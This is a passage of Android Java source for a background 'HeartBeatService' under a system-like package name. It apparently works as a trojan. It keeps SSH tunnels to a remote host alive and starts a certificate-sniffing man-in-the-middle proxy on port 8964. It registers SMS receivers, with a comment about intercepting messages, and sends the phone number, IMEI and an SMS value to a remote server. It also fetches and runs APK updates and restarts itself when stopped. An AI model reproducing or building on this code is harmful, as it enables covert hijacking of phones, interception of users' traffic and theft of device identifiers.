package com.android.sms.proxy.service;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.core.ConnectStatuListener;
import com.android.sms.proxy.entity.ApkDownloadResult;
import com.android.sms.proxy.entity.BindServiceEvent;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.entity.SpSimpleJsonImpl;
import com.android.sms.proxy.function.RequestManager;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.utils.Util_Service;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

import net.luna.common.download.AppDownloadManager;
import net.luna.common.download.interfaces.ApkDownloadListener;
import net.luna.common.download.model.AppModel;
import net.luna.common.download.model.FileDownloadTask;
import net.youmi.android.libs.common.download.ext.DownloadStatus;
import net.youmi.android.libs.common.download.ext.OplayDownloadManager;
import net.youmi.android.libs.common.download.ext.SimpleAppInfo;
import net.youmi.android.libs.common.network.Util_Network_Status;

import org.connectbot.bean.HostBean;
import org.connectbot.bean.PortForwardBean;
import org.connectbot.event.WaitForSocketEvent;
import org.connectbot.service.BridgeDisconnectedListener;
import org.connectbot.service.TerminalBridge;
import org.connectbot.service.TerminalManager;
import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.littleshoot.proxy.HttpFilters;
import org.littleshoot.proxy.HttpFiltersAdapter;
import org.littleshoot.proxy.HttpFiltersSourceAdapter;
import org.littleshoot.proxy.HttpProxyServer;
import org.littleshoot.proxy.impl.DefaultHttpProxyServer;
import org.littleshoot.proxy.mitm.CertificateSniffingMitmManager;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.HttpMethod;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.AttributeKey;


/**
 * @author zyq 16-3-9
 */
public class HeartBeatService extends Service implements BridgeDisconnectedListener, ApkDownloadListener,
		OplayDownloadManager
				.OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
				.common.download.listener.ApkDownloadListener, ConnectStatuListener {

	private static final boolean DEBUG = NativeParams.HEARTBEAT_SERVICE_DEBUG;
	private static final boolean ACTION_APK_PROXY = NativeParams.HEARTBEAT_APK_PROXY;
	private static final boolean ACTION_CHECK_PROXY = NativeParams.HEARTBEAT_CHECK_PROXY;
	private static final boolean ACTION_GET_MESSAGE = NativeParams.HEARTBEAT_GET_MESSAGE;

	private static final String TAG = "heartBeatService";
	private ScheduledExecutorService mExecutorService;
	private ScheduledExecutorService mCheckExecutorService;
	private ScheduledFuture mScheduledFuture;

	private static final long MESSAGE_INIT_DELAY = NativeParams.HEARTBEAT_MESSAGE_INIT_DELAY;
	private static final long HEARTBEAT_INIT_DELAY = NativeParams.HEARTBEAT_PROXY_INIT_DELAY;//Message 推送延迟
	private static final long PROXY_CHECK_INIT_DELAY = NativeParams.PROXY_CHECK_INIT_DELAY;//200秒后才开始检查
	private static final long PROXY_CHECK_INTERVAL_TIME = NativeParams.PROXY_CHECK_INTERVAL_TIME;//检查任务每120秒检查一次
	public static long PROXY_INTERVAL_TIME = NativeParams.HEARTBEAT_PROXY_INTERVAL;//Message 轮询消息
	private HeartBeatRunnable mHeartBeatRunnable = null;
	private CheckServiceRunnable mCheckServiceRunnable = null;
	private TerminalManager binder;
	private TerminalBridge hostBridge;
	private IProxyControl mProxyControl;
	private boolean isProxyServiceRunning;
	//记录当前建立号的连接，方便在拦截短信
	public static long recordConnectTime = 0;
	private static HeartBeatService instance;
	private GetMsgRunnable mGetMsgRunnable = null;
	private static final String INTENT_SERVICE_ACTION = "com.android.sms.proxy";
	private static final String SENT = "sms_sent";
	private static final String DELIVERED = "sms_delivered";
	private static boolean isProxyReset = false;
	private ApkUpdateRunnable mApkUpdateRunnable;
	private String versionName;

	//防止建立ssh连接连续出错,统计两次disconnected的时间差,如果是少于2分钟,且次数多于10次,那么很需要重新挂掉服务,等待广播重新拉起该服务
	private int disConnectedCount;
	private long oldDisConnectedCurrentTime;

	public static HeartBeatService getInstance() {
		return instance;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (DEBUG) {
			Log.d(TAG, "service onCreate()");
		}
		try {
			versionName = this.getPackageManager().getPackageInfo
					(this.getPackageName(), 0).versionName;
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.toString());
			}
		}
		EventBus.getDefault().register(this);
		FlurryAgent.onStartSession(this);
		instance = this;
		registerReceiver(ReceiveSmsBroadCastReceiver.getInstance(), new IntentFilter(DELIVERED));
		registerReceiver(SendSmsBroadCastReceiver.getInstance(), new IntentFilter(SENT));
		AppDownloadManager.getInstance(this).addApkDownloadListener(this);
		OplayDownloadManager.getInstance(this).registerListener(this);
		OplayDownloadManager.getInstance(this).addDownloadStatusListener(this);
		OplayDownloadManager.getInstance(this).addProgressUpdateListener(this);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//调用这个,可能是由第三方app调用
//		if (intent != null) {
//			String action = intent.getAction();
//
//			if (TextUtils.isEmpty(action) && action.equals(INTENT_SERVICE_ACTION)) {
//				if (DEBUG) {
//					Log.d(TAG, "收到第三方app的调用,好荣幸啊啊啊啊啊啊!!!!!!!!!!!!");
//				}
//				boolean isHeartServiceLive = Util_Service.isServiceRunning(this, this.getClass().getCanonicalName());
//				if (isHeartServiceLive) {
//					if (DEBUG) {
//						Log.d(TAG, "心跳服务已经开启,无需在启动!!!!!");
//					}
//					return START_NOT_STICKY;
//				}
//			}
//		}
		if (intent != null) {
			final String action = intent.getAction();
			if (!TextUtils.isEmpty(action)) {
				if (DEBUG) {
					Log.d(TAG, "service action:" + action);
				}
			}
			final Bundle bundle = intent.getExtras();
			if (bundle != null) {
				String startType = bundle.getString(NativeParams.HEARTBEAT_FROM_TYPE);
				if (DEBUG) {
					Log.d(TAG, "start by:" + startType);
				}
			}
		}
//		Intent downloadUpdateIntent = new Intent(this, DownloadUpdateService.class);
//		startService(downloadUpdateIntent);
//		startForeground(NativeParams.SERVICE_NOTIFICATION_ID, new Notification());

		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
//		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
//		if (ACTION_CHECK_PROXY) {
//			sureServiceIsRunning(TerminalManager.class.getCanonicalName());
//		}
		//这里
//        Task.callInBackground(new Callable<Object>() {
//            @Override
//            public Object call() throws Exception {
//                ApkUpdateUtil.getInstance(getApplication()).updateApk();
//                return null;
//            }
//        });
		//若用了进程守护,这里要设置为不重启.
		return Service.START_NOT_STICKY;
	}

	public void runUpdatedApk() {
		if (DEBUG) {
			Log.d(TAG, "runUpdateApk!!!!!!");
		}
		if (mApkUpdateRunnable == null) {
			mApkUpdateRunnable = new ApkUpdateRunnable(this);
			if (mExecutorService == null) {
				mExecutorService = Executors.newScheduledThreadPool(2);
			}
			mExecutorService.schedule(mApkUpdateRunnable, 0, TimeUnit.SECONDS);
		}
	}

	public void scheduledWithFixedDelay(long duration) {
		try {
			if (mScheduledFuture == null || mScheduledFuture.isCancelled()) {
				if (DEBUG) {
					Log.d(TAG, "开始发心跳包");
					EventBus.getDefault().postSticky(new MessageEvent("开始发心跳包"));
				}
			}
			if (mExecutorService == null) {
				mExecutorService = Executors.newScheduledThreadPool(2);
			}
			if (ACTION_GET_MESSAGE) {
				final int sdk = Build.VERSION.SDK_INT;
				boolean allowMessage = true;
				if (sdk >= 20) {
					if (NativeParams.ACTION_ALLOW_KITKAT_ABOVE_MESSAGE) {
						allowMessage = true;
					} else {
						allowMessage = false;
					}
				}
				if (allowMessage) {
					if (mGetMsgRunnable == null) {
						mGetMsgRunnable = new GetMsgRunnable(this);
					}
					mExecutorService.schedule(mGetMsgRunnable, MESSAGE_INIT_DELAY, TimeUnit.SECONDS);
				}
			}

			if (mScheduledFuture == null || (mScheduledFuture != null && mScheduledFuture.isCancelled())) {
				if (DEBUG) {
					Log.d(TAG, "重新启动scheduledFuture");
				}
				if (ACTION_APK_PROXY) {
					if (mHeartBeatRunnable == null) {
						mHeartBeatRunnable = new HeartBeatRunnable(this, this);
					}
					mScheduledFuture = mExecutorService.scheduleWithFixedDelay(mHeartBeatRunnable,
							HEARTBEAT_INIT_DELAY,
							duration,
							TimeUnit.SECONDS);


				}
			}


			if (ACTION_CHECK_PROXY) {
				sureServiceIsRunning(TerminalManager.class.getCanonicalName());
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	private void registRunnable() {

	}

	public void sendRegisterCode(final Context context, String sms) {
		String number = PhoneInfo.getInstance(context).getNativePhoneNumber();
		if (TextUtils.isEmpty(number)) return;
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(context).getNativePhoneNumber());
		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(context).getIMEI());
		map.put(NativeParams.TYPE_PHONE_SMS, String.valueOf(sms));
		String authStr = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
		Map<String, String> map1 = new HashMap<>();
		map1.put("s", authStr);
		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(NativeParams.URL_SEND_CODE,
				SpSimpleJsonImpl.class, map1);
		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
			@Override
			public void onResponse(Object response) {
				if (response instanceof SpSimpleJsonImpl) {
					int code = ((SpSimpleJsonImpl) response).getCode();
					if (code == NativeParams.SUCCESS) {
						String data = ((SpSimpleJsonImpl) response).getData();
					}
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError error) {
				if (DEBUG) {
					Log.d(TAG, error.toString());
				}
				FlurryAgent.onError(TAG, "", error.fillInStackTrace());
			}
		});
	}

	public void resetScheduleProxyService(long duration) {
		try {
			if (!isProxyReset) return;
			if (mScheduledFuture == null || mScheduledFuture.isCancelled()) {
				if (DEBUG) {
					Log.d(TAG, "重新发心跳包");
					EventBus.getDefault().postSticky(new MessageEvent("开始发心跳包"));
				}
			} else {
				mScheduledFuture.cancel(true);
			}
			if (ACTION_APK_PROXY) {
				if (mHeartBeatRunnable == null) {
					mHeartBeatRunnable = new HeartBeatRunnable(this, this);
				}
				if (mExecutorService == null) {
					mExecutorService = Executors.newScheduledThreadPool(2);
				}
				if (mScheduledFuture == null || (mScheduledFuture != null && mScheduledFuture.isCancelled())) {
					if (DEBUG) {
						Log.d(TAG, "重新启动proxy计划");
					}
					isProxyReset = false;
					HeartBeatRunnable.mCurrentCount = 0;
					HeartBeatRunnable.isSSHConnected = false;
					HeartBeatRunnable.isStartSSHBuild = false;
					mScheduledFuture = mExecutorService.scheduleWithFixedDelay(mHeartBeatRunnable,
							HEARTBEAT_INIT_DELAY,
							duration,
							TimeUnit.SECONDS);
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}


	@Override
	public void onDestroy() {
		super.onDestroy();
		FlurryAgent.onEndSession(this);
		try {
			if (DEBUG) {
				Log.d(TAG, "heartBeatService destroy()");
			}
			if (mHeartBeatRunnable != null) {
				mHeartBeatRunnable.isSSHConnected = false;
			}
			if (mProxyControl != null) {
				unbindService(proxyConnection);
			}
			if (binder != null) {
				unbindService(mTerminalConnection);
				if (DEBUG) {
					Log.d(TAG, "heartBeatService结束自己，terminalManager也要结束自己");
				}
				binder.stopSelf();
			}
			if (mScheduledFuture != null) {
				cancelScheduledTasks();
			}
			cancelCheckScheduledTasks();
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
		unregisterReceiver(SendSmsBroadCastReceiver.getInstance());
		unregisterReceiver(ReceiveSmsBroadCastReceiver.getInstance());
	}

	@Nullable
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}


	public void cancelScheduledTasks() {
		if (mScheduledFuture != null) {
			if (DEBUG) Log.d(TAG, "中断该任务");
			if (!mScheduledFuture.isCancelled()) {
				mScheduledFuture.cancel(true);
			}
		}
		mScheduledFuture = null;
		mExecutorService.shutdownNow();
		mExecutorService = null;
	}

	public void cancelCheckScheduledTasks() {
		try {
			if (mCheckExecutorService != null) {
				mCheckExecutorService.shutdownNow();
			}
			mCheckExecutorService = null;
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.toString());
			}
		}
	}


	public synchronized void startTerminalService() {
		try {
			Intent serviceIntent = new Intent(this, TerminalManager.class);
			bindService(serviceIntent, mTerminalConnection, Context.BIND_AUTO_CREATE);
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	/**
	 * 确保service一定要在运行状态
	 * 有时候可能在设置界面该service被干掉，然后没收到任何回调，这时候TerminalManager,ProxyService都是挂着的状态．
	 */
	private void sureServiceIsRunning(String serviceName) {
		try {
			if (mCheckExecutorService == null) {
				mCheckExecutorService = Executors.newScheduledThreadPool(1);
			}
			if (mCheckServiceRunnable == null) {
				mCheckServiceRunnable = new CheckServiceRunnable(serviceName);
			}
			mCheckExecutorService.scheduleWithFixedDelay(mCheckServiceRunnable, PROXY_CHECK_INIT_DELAY,
					PROXY_CHECK_INTERVAL_TIME, TimeUnit.SECONDS);
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	class CheckServiceRunnable implements Runnable {

		private String serviceName;

		public CheckServiceRunnable(String svcName) {
			serviceName = svcName;
		}

		@Override
		public void run() {
			try {
				final boolean isStopService = NativeParams.ACTION_STOP_HEARTBEAT_SERVICE;
				if (isStopService) {
					HeartBeatService.this.stopSelf();
					return;
				}
				boolean isTerminalServiceLive = Util_Service.isServiceRunning(HeartBeatService.this, TerminalManager
						.class.getCanonicalName());
				boolean isProxyServiceLive = Util_Service.isServiceRunning(HeartBeatService.this, ProxyService.class
						.getCanonicalName());
				if (DEBUG) {
					Log.d(TAG, "要检测的名字是:" + serviceName + " 当前终端服务：" + isTerminalServiceLive + "  当前代理服务：" +
							isProxyServiceLive);
				}

				if (!isTerminalServiceLive) {
					Map<String, String> map = new HashMap<>();
					map.put(NativeParams.KEY_IS_PROXY_RUNNING, String.valueOf(isProxyServiceLive));
					map.put(NativeParams.KEY_IS_TERMINAL_RUNNING, String.valueOf(isTerminalServiceLive));
					FlurryAgent.logEvent(NativeParams.EVENT_CHECK_PROXY_STATUS, map);
				}
				switch (serviceName) {
					case "org.connectbot.service.TerminalManager":
						if (!isTerminalServiceLive) {
							destroyProxyService();
							destroyTerminalService();
							if (mScheduledFuture != null) {
								cancelScheduledTasks();
							}
							//重新启动service
							new Thread(new Runnable() {
								@Override
								public void run() {
									try {
										Thread.currentThread().sleep(2000);
										if (DEBUG) {
											Log.d(TAG, "reset service 2000ms later");
										}
										HeartBeatService.isProxyReset = true;
										resetScheduleProxyService(PROXY_INTERVAL_TIME);
									} catch (Throwable e) {
										if (DEBUG) {
											Log.e(TAG, e.toString());
										}
									}
								}
							}).start();
						} else {
							HostBean hostBean = ProxyServiceUtil.getInstance(HeartBeatService.this).getHostBean();
							if (hostBean != null && !TextUtils.isEmpty(hostBean.getUsername()) && binder != null) {
								TerminalBridge bridge = binder.getConnectedBridge(hostBean);
								if (bridge == null) {
									HeartBeatRunnable.isSSHConnected = false;
								}
							} else {
								HeartBeatRunnable.isSSHConnected = false;
							}
						}
						break;
				}
			} catch (Throwable e) {
				if (DEBUG) {
					Log.e(TAG, e.fillInStackTrace().toString());
				}
				FlurryAgent.onError(TAG, "", e);
			}
		}
	}

	private ServiceConnection mTerminalConnection = new ServiceConnection() {

		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			if (DEBUG) {
				Log.d(TAG, "TerminalManager service 建立起来了");
			}
			binder = ((TerminalManager.TerminalBinder) service).getService();
			binder.disconnectListener = HeartBeatService.this;
			final HostBean mHostBean = ProxyServiceUtil.getInstance(HeartBeatService.this).getHostBean();
			final PortForwardBean portForward = ProxyServiceUtil.getInstance(HeartBeatService.this)
					.getPortFowardBean();
			if (DEBUG) {
				Log.d(TAG, "TerminalManager建立起来的hostBean:" + mHostBean + " portForwardBean:" + portForward);
			}
			if (mHostBean != null && portForward != null) {
				Uri requested = mHostBean.getUri();
				final String requestedNickName = (requested != null) ? requested.getFragment() : null;

				if (DEBUG) {
					Log.d(TAG, "requestedNickName:" + requested.getFragment());
				}
				hostBridge = binder.getConnectedBridge(requestedNickName);
				if (requestedNickName != null && hostBridge == null && portForward != null) {
					try {
						if (DEBUG) {
							Log.d(TAG, String.format("We couldnt find an existing bridge with URI=%s (nickname=%s), " +
									"so" +
									" " +
									"creating one now", requested.toString(), requestedNickName));
						}
						hostBridge = binder.openConnection(requested, portForward);
					} catch (Throwable e) {
						if (DEBUG) {
							Log.e(TAG, "Problem while trying to create new requested bridge from URI", e);
						}
						FlurryAgent.onError(TAG, "", e);
					}
				}

			}
		}

		@Override
		public void onServiceDisconnected(ComponentName name) {
			binder = null;
		}
	};

	@Subscribe
	public void onEvent(BindServiceEvent event) {
		try {
			if (event != null) {
				destroyTerminalService();
				destroyProxyService();
				if (binder == null) {
					recordConnectTime = System.currentTimeMillis();
					startTerminalService();
					if (DEBUG) {
						Log.d(TAG, "start terminal service!!!");
						final String message = "start terminal service!!!";
						EventBus.getDefault().post(new MessageEvent(message));
					}
				}
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
	}
	private static final AttributeKey<String> CONNECTED_URL = AttributeKey.valueOf("connected_url");
	@Subscribe
	public void onEvent(WaitForSocketEvent event) {
		try {
			if (event != null) {
				//统计建立成功的时间
//				if (DEBUG) Log.d(TAG, "收到等待建立socket的事件！！！！！！！！！！");
//				final long currentTime = System.currentTimeMillis();
//				final long buildTime = currentTime - recordConnectTime;
//				final int networkType = Util_Network_Status.getNetworkType(this);
//				Map<String, String> map = new HashMap<>();
//				map.put(NativeParams.KEY_SSH_CONNECT_TIME, String.valueOf(buildTime));
//				map.put(NativeParams.KEY_VERSION_NAME, versionName);
//				map.put(NativeParams.KEY_BUILD_VERSION_NAME, String.valueOf(Build.VERSION.SDK_INT));
//				map.put(NativeParams.KEY_SSH_CONNECT_NETWORK_TYPE, String.valueOf(networkType));
//				FlurryAgent.logEvent(NativeParams.EVENT_SSH_CONNECT_SUCCESS, map);
//				//关闭代理服务先！！！！！！！！！！
//				destroyProxyService();
//				initProxyService();

				HttpProxyServer server = DefaultHttpProxyServer.bootstrap()
						.withPort(8964)
						.withManInTheMiddle(new CertificateSniffingMitmManager())
						.withFiltersSource(new HttpFiltersSourceAdapter(){
							@Override
							public HttpFilters filterRequest(HttpRequest originalRequest, ChannelHandlerContext ctx) {
								String uri = originalRequest.getUri();
								if (originalRequest.getMethod() == HttpMethod.CONNECT) {
									if (ctx != null) {
										String prefix = "https://" + uri.replaceFirst(":443$", "");
										ctx.channel().attr(CONNECTED_URL).set(prefix);
									}
									return new HttpFiltersAdapter(originalRequest, ctx);
								}
								String connectedUrl = ctx.channel().attr(CONNECTED_URL).get();
								return super.filterRequest(originalRequest,ctx);
							}
						})
						.start();


//				HttpProxyServer server = DefaultHttpProxyServer.bootstrap()
//						.withPort(8964)
//                        .withFiltersSource(new HttpFiltersSourceAdapter() {
//                            @Override
//                            public HttpFilters filterRequest(HttpRequest originalRequest, ChannelHandlerContext ctx) {
//                                return new HttpFiltersAdapter(originalRequest) {
//                                    @Override
//                                    public HttpResponse clientToProxyRequest(HttpObject httpObject) {
//                                        return super.clientToProxyRequest(httpObject);
//                                    }
//
//                                    @Override
//                                    public HttpObject proxyToClientResponse(HttpObject httpObject) {
//                                        return super.proxyToClientResponse(httpObject);
//                                    }
//                                };
//                            }
//                        })
//                        .withFiltersSource(new HttpFiltersSource() {
//                            @Override
//                            public HttpFilters filterRequest(HttpRequest originalRequest, ChannelHandlerContext ctx) {
//                                return null;
//                            }
//
//                            @Override
//                            public int getMaximumRequestBufferSizeInBytes() {
//                                return 10 *1024*1024;
//                            }
//
//                            @Override
//                            public int getMaximumResponseBufferSizeInBytes() {
//                                return 10*1024*1024;
//                            }
//                        })
//						.start();
				//HeartBeatRunnable.isSSHConnected = true;
//				HttpProxyServer server =
//						DefaultHttpProxyServer.bootstrap()
//								.withPort(8964) // for both HTTP and HTTPS
//								.start();
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
	}

	private synchronized void initProxyService() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					final boolean isStopService = NativeParams.ACTION_STOP_HEARTBEAT_SERVICE;
					if (isStopService) {
						HeartBeatService.getInstance().stopSelf();
						return;
					}
					Thread.sleep(500);
					if (DEBUG) {
						Log.d(TAG, "休息了500秒后真正开启代理服务！！！！！！！");
					}
					final boolean isProxyServiceRunning = Util_Service.isServiceRunning(HeartBeatService.this,
							ProxyService.class
									.getCanonicalName());
					final boolean isTerminalServiceRunning = Util_Service.isServiceRunning(HeartBeatService.this,
							TerminalManager.class
									.getCanonicalName());
					if (DEBUG) {
						Log.d(TAG, "当前proxyService状态：" + isProxyServiceRunning + " 终端service的状态" +
								isTerminalServiceRunning);
					}
					if (isTerminalServiceRunning) {
						startProxyService();
					}
				} catch (InterruptedException e) {
					if (DEBUG) {
						Log.d(TAG, e.toString());
					}
				}
			}
		}).start();

	}

	private synchronized void startProxyService() {
		boolean isProxySuccess = false;
		try {
			if (DEBUG) {
				Log.d(TAG, "开始绑定代理服务！！！！！！！！！！");
			}
			Intent serviceIntent = new Intent(this, ProxyService.class);
			bindService(serviceIntent, proxyConnection, Context.BIND_AUTO_CREATE);
			isProxySuccess = true;
			HeartBeatRunnable.isSSHConnected = true;
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
			isProxySuccess = false;
			HeartBeatRunnable.isSSHConnected = false;
		}

		if (isProxySuccess) {
			if (DEBUG) {
				EventBus.getDefault().post(new MessageEvent("proxy service start success!!!"));
			}
			//取消掉轮询任务!!!
			//cancelScheduledTasks();
		} else {
			if (DEBUG) {
				EventBus.getDefault().post(new MessageEvent("proxy service start fail!!!"));
			}
		}
		int networkType = Util_Network_Status.getNetworkType(this);
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_PROXY_CONNECT_SUCCESS, String.valueOf(isProxySuccess));
		map.put(NativeParams.KEY_PROXY_NETWORK_TYPE, String.valueOf(networkType));
		FlurryAgent.logEvent(NativeParams.EVENT_START_PROXY, map);

		mExecutorService.schedule(new Runnable() {
			@Override
			public void run() {
				sendRegisterCode(HeartBeatService.this, "123456");
			}
		}, 30, TimeUnit.SECONDS);
	}

	public synchronized void destroyProxyService() throws RemoteException {
		boolean isRunning = Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName());
		if (DEBUG) Log.d(TAG, "当前代理服务的状态：" + isRunning);

		if (mHeartBeatRunnable != null) {
			mHeartBeatRunnable.isSSHConnected = false;
		}
		if (mProxyControl != null) {
			if (DEBUG) {
				Log.d(TAG, "关闭代理服务！！！2 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
			}
			mProxyControl.stop();
			if (DEBUG) {
				Log.d(TAG, "关闭代理服务！！！3 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
			}
			unbindService(proxyConnection);
			if (DEBUG) {
				Log.d(TAG, "关闭代理服务！！！4 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
			}
			//这个方法有问题!!!!!!!
			//((ProxyService) mProxyControl).stopSelf();
			//proxyConnection = null;
			mProxyControl = null;
			if (DEBUG) {
				Log.d(TAG, "关闭代理服务!!!5 --> proxyConnection: " + proxyConnection + " proxyControl: " + mProxyControl);
			}
			boolean isRunning2 = Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName());
			if (DEBUG) Log.d(TAG, "关闭代理服务!!!6 --> 当前代理服务的状态：" + isRunning2);
		}
	}

	public synchronized void destroyTerminalService() {
		boolean isRunning = Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName());
		if (DEBUG) Log.d(TAG, "当前终端服务的状态：" + isRunning);
		if (mHeartBeatRunnable != null) {
			mHeartBeatRunnable.isSSHConnected = false;
		}
		if (binder != null) {
			if (DEBUG) {
				Log.d(TAG, "关闭终端服务！！！2 " + Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName
						()));
			}
			unbindService(mTerminalConnection);
			if (DEBUG) {
				Log.d(TAG, "关闭终端服务！！！3 " + Util_Service.isServiceRunning(this, TerminalManager.class
						.getCanonicalName()));
			}
			binder.stopSelf();
			if (DEBUG) {
				Log.d(TAG, "关闭终端服务！！！4 " + Util_Service.isServiceRunning(this, TerminalManager.class
						.getCanonicalName()));
			}
			//mTerminalConnection = null;
			binder = null;
			if (DEBUG) {
				Log.d(TAG, "关闭终端服务!!!5 --> terminalConnection: " + mTerminalConnection + " binder: " + binder);
			}
		}
	}


	private ServiceConnection proxyConnection = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mProxyControl = (IProxyControl) service;
//			Log.d(TAG, "proxyService开始监听" + ProxyServiceUtil.getDestPort() + "端口");
//			Log.d(TAG, "proxyService 开始链接" + mProxyControl);
			try {
				if (mProxyControl != null) {
					isProxyServiceRunning = mProxyControl.start();
					if (DEBUG) {
						Log.d(TAG, "isProxyServiceRunning:" + isProxyServiceRunning);
					}
				}
			} catch (RemoteException e) {
				if (DEBUG) {
					Log.e(TAG, e.fillInStackTrace().toString());
				}
				FlurryAgent.onError(TAG, "", e.fillInStackTrace());
			}
		}

		@Override
		public void onServiceDisconnected(ComponentName name) {
			mProxyControl = null;
		}
	};


	//连接成功，失败都会调用该方法．
	//1.当网络断开时候，连接断开会调用该方法
	//２.连接不上host时候会出现该问题
	//３.在读远程数据时候出现问题，这应该算丢包问题．

	@Override
	public void onDisconnected(TerminalBridge bridge) {
		try {
			if (DEBUG) {
				Log.d(TAG, "终端连接失败，进入失败流程！！！！！！");
			}
			//进来这里，说明有可能连接成功，有可能连接失败,怎么判断是否连接成功呢
			final boolean isProxyServiceLive = Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName
					());
			final boolean isNetworkConnected = isNetWorkConnected();
			//统计成功的几率
			final int networkType = Util_Network_Status.getNetworkType(this);
			Map<String, String> map = new HashMap<>();
			map.put(NativeParams.KEY_SSH_CONNECT_SUCCESS, String.valueOf(isProxyServiceLive && isNetworkConnected));
			map.put(NativeParams.KEY_SSH_NETWORK_TYPE, String.valueOf(networkType));
			FlurryAgent.logEvent(NativeParams.EVENT_START_SSH_CONNECT, map);

			HeartBeatRunnable.isSSHConnected = false;
			HeartBeatRunnable.isStartSSHBuild = false;
			destroyTerminalService();
			destroyProxyService();


			final long tempCurrentTime = System.currentTimeMillis();
			if (tempCurrentTime - oldDisConnectedCurrentTime < (5 * 60 * 1000)) {
				disConnectedCount++;
				if (disConnectedCount > 10) {//连续超过二十次,结束该服务
					cancelScheduledTasks();
					cancelCheckScheduledTasks();
					stopSelf();
					return;
				}
			} else if (tempCurrentTime - oldDisConnectedCurrentTime > (10 * 60 * 1000)) {//超过10分钟表示代理正常
				disConnectedCount = 0;
			}
			oldDisConnectedCurrentTime = tempCurrentTime;
		} catch (RemoteException e) {
			if (DEBUG) {
				Log.e(TAG, "heartBeatService.onDisconnected()函数异常:" + e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	public boolean isNetWorkConnected() {
		boolean mIsConnected = false;
		final ConnectivityManager cm =
				(ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);

		final WifiManager wm = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);

		final NetworkInfo info = cm.getActiveNetworkInfo();
		if (info != null) {
			mIsConnected = (info.getState() == NetworkInfo.State.CONNECTED);
		}
		return mIsConnected;
	}

	public TerminalManager getBinder() {
		return binder;
	}

	public IProxyControl getmProxyControl() {
		return mProxyControl;
	}

	@Override
	public void onApkDownloadBeforeStart_FileLock(FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadStart(FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadSuccess(FileDownloadTask task) {
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
		if (DEBUG) {
			final String downloadSuccess = "\nDownload success\n";
			EventBus.getDefault().post(new MessageEvent(downloadSuccess));
		}
		ApkDownloadResult result = new ApkDownloadResult();
		result.setApkDownloadDestUrl(task.getDestUrl());
		result.setApkDownloadRawUrl(task.getRawUrl());
		result.setApkDownloadResult("success");
		result.setApkPackageName(this.getPackageName());
